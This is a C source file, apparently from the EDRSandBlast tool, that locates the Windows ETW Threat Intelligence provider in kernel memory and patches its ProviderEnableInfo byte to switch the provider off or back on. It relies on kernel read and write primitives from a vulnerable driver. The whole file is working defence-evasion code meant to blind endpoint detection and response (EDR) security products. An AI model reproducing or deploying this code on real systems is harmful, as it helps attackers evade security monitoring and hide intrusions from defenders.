/*

--- ETW Threat Intelligence operations.
--- Inspiration and credit: https://public.cnotools.studio/bring-your-own-vulnerable-kernel-driver-byovkd/exploits/data-only-attack-neutralizing-etwti-provider

*/

#include <Windows.h>
#include <Tchar.h>

#include "../EDRSandBlast.h"
#include "ETWThreatIntel.h"
#include "KernelMemoryPrimitives.h"
#include "NtoskrnlOffsets.h"


DWORD64 GetEtwThreatInt_ProviderEnableInfoAddress(BOOL verbose) {
    if (g_ntoskrnlOffsets.st.etwThreatIntProvRegHandle == 0x0 || g_ntoskrnlOffsets.st.etwRegEntry_GuidEntry == 0x0 || g_ntoskrnlOffsets.st.etwGuidEntry_ProviderEnableInfo == 0x0) {
        _putts_or_not(TEXT("[!] [ETWTI]\tETW Threat Intel ProviderEnableInfo address could not be found. This version of ntoskrnl may not implement ETW Threat Intel."));
        return 0x0;
    }

    DWORD64 etwThreatInt_ETW_REG_ENTRYAddress = ReadKernelMemoryDWORD64(g_ntoskrnlOffsets.st.etwThreatIntProvRegHandle);
    if (verbose) {
        _tprintf_or_not(TEXT("[+] [ETWTI]\tFound ETW Threat Intel provider _ETW_REG_ENTRY at 0x%I64x\n"), etwThreatInt_ETW_REG_ENTRYAddress);
    }
    DWORD64 etwThreatInt_ETW_GUID_ENTRYAddress = ReadMemoryDWORD64(etwThreatInt_ETW_REG_ENTRYAddress + g_ntoskrnlOffsets.st.etwRegEntry_GuidEntry);
    
    return etwThreatInt_ETW_GUID_ENTRYAddress + g_ntoskrnlOffsets.st.etwGuidEntry_ProviderEnableInfo;
}

void EnableDisableETWThreatIntelProvider(BOOL verbose, BOOL enable) {
    DWORD64 etwThreatInt_ProviderEnableInfoAddress = GetEtwThreatInt_ProviderEnableInfoAddress(verbose);
    if (etwThreatInt_ProviderEnableInfoAddress == 0x0) {
        return;
    }

    _tprintf_or_not(TEXT("[+] [ETWTI]\t%s the ETW Threat Intel provider by patching ProviderEnableInfo at 0x%I64x with 0x%02X.\n"),
        enable ? TEXT("(Re)enabling") : TEXT("Disabling"), etwThreatInt_ProviderEnableInfoAddress, enable ? ENABLE_PROVIDER : DISABLE_PROVIDER);
    WriteMemoryBYTE(etwThreatInt_ProviderEnableInfoAddress, enable ? ENABLE_PROVIDER : DISABLE_PROVIDER);

    _tprintf_or_not(TEXT("[+] [ETWTI]\tThe ETW Threat Intel provider was successfully %s!\n"), enable ? TEXT("enabled") : TEXT("disabled"));
}


void DisableETWThreatIntelProvider(BOOL verbose) {
    EnableDisableETWThreatIntelProvider(verbose, FALSE);
}


void EnableETWThreatIntelProvider(BOOL verbose) {
    EnableDisableETWThreatIntelProvider(verbose, TRUE);
}


BOOL isETWThreatIntelProviderEnabled(BOOL verbose) {
    DWORD64 etwThreatInt_ProviderEnableInfoAddress = GetEtwThreatInt_ProviderEnableInfoAddress(verbose);

    if (etwThreatInt_ProviderEnableInfoAddress == 0x0) {
        return FALSE;
    }
    
    BYTE etwThreatInt_ProviderEnableInfoValue = ReadMemoryBYTE(etwThreatInt_ProviderEnableInfoAddress);

    return etwThreatInt_ProviderEnableInfoValue == ENABLE_PROVIDER;
}